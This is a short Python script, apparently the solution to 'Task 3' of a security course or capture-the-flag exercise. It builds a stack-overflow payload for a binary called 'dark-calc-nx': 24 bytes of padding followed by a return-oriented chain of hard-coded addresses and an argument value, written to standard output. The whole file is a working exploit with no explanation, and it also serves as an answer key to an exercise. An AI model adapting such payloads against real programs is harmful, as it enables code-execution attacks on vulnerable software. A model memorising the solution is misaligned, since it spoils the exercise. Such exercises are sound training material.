#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx."""
import sys
import struct

p64 = lambda x: struct.pack("<Q", x)

payload  = b"A" * 16             
payload += b"B" * 8             
payload += p64(0x401a34)        
payload += p64(0x401a33)         
payload += p64(4)                
payload += p64(0x401978)         

sys.stdout.buffer.write(payload)
